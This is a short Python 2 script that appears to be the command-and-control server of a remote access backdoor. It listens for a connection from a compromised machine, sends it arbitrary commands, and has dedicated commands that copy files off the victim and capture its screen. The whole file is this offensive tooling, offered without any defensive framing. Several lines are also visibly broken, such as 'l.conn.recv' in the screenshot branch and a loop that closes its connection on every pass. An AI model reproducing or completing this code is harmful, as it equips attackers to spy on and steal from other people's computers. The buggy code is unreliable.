import socket
from random import randint

HOST = ""
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind((HOST,PORT))
    print "[+] Server Bound"

    s.listen(1)
    print "[+] Listening for connection"

    conn, addr = s.accept()
    print "[+] Connection received from " + str(addr)

    while True:
        data = conn.recv(1024)
        if not data:
            break
        print "[+] Message recieved: " + str(data)



    while True:
        conn.close()
        s.listen(1)
        conn, addr = s.accept()
        cmd = raw_input()

        if "rb.filetrans" in cmd:
            fn = raw_input("File name: ")
            f = open(fn, "wb")
            l = raw_input("Target file address: ")
            conn.send("rb.filetrans " + fn + " " + l)
            l = conn.recv(1024)
            while (l):
                print "Receiving..."
                f.write(l)
                l = conn.recv(1024)
            f.close()

        if "rb.screenshot" in cmd:
            fn = string = "scrsht_" + str(randint(1000,9999)) + ".png"
            f = open(fn, "wb")
            conn.send("rb.screenshot")
            l.conn.recv(1024)
            while(l):
                print "Receiving..."
                f.write(l)
                l = conn.recv(1024)

        else:
            conn.send(cmd)
            data = conn.recv(2048)
            print str(data)

except ValueError:
    "[-] something went wrong"
    s.close()